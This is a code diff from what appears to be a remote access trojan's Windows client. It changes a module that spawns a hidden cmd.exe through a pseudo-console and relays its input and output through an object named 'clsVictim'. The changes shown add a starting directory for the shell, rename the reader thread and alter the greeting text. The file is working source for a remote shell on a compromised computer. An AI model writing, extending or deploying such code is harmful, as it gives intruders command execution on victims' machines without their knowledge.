@@ -34,10 +34,12 @@ namespace winClient48
         public Action<byte[]> actOnOutput;
 
         private readonly clsVictim m_victim;
+        private readonly string m_szInitDir;
 
-        public clsfnXterm(clsVictim victim)
+        public clsfnXterm(clsVictim victim, string szInitDir)
         {
             m_victim = victim;
+            m_szInitDir = szInitDir;
 
             actOnOutput += data =>
             {
@@ -80,12 +82,10 @@ namespace winClient48
             if (hr != 0)
                 throw new InvalidOperationException($"CreatePseudoConsole failed: 0x{hr:X}");
 
-            // --- Spawn cmd.exe ---
             fnStartProcessWithConPTY("cmd.exe /Q /K");
 
-            // --- Start reader thread ---
             m_isRunning = true;
-            m_readThread = new Thread(ReadLoop)
+            m_readThread = new Thread(fnReadLoop)
             {
                 IsBackground = true
             };
@@ -161,7 +161,7 @@ namespace winClient48
                     false,
                     WinAPI.EXTENDED_STARTUPINFO_PRESENT,
                     IntPtr.Zero,
-                    null,
+                    m_szInitDir,
                     ref siEx,
                     out WinAPI.PROCESS_INFORMATION pi
                 );
@@ -172,7 +172,7 @@ namespace winClient48
                 m_hProcess = pi.hProcess;
                 m_hThread = pi.hThread;
 
-                fnPushInput("echo HELLO_FROM_CMD\r\n");
+                fnPushInput($"echo Welcome to Xterm Shell\r\n");
                 fnPushInput("echo READY\r\n");
             }
             finally
@@ -188,7 +188,7 @@ namespace winClient48
         /// <summary>
         /// Read loop.
         /// </summary>
-        private void ReadLoop()
+        private void fnReadLoop()
         {
             var buffer = new byte[4096];
 
@@ -251,5 +251,4 @@ namespace winClient48
             WinAPI.ResizePseudoConsole(m_hPC, size);
         }
     }
-
 }
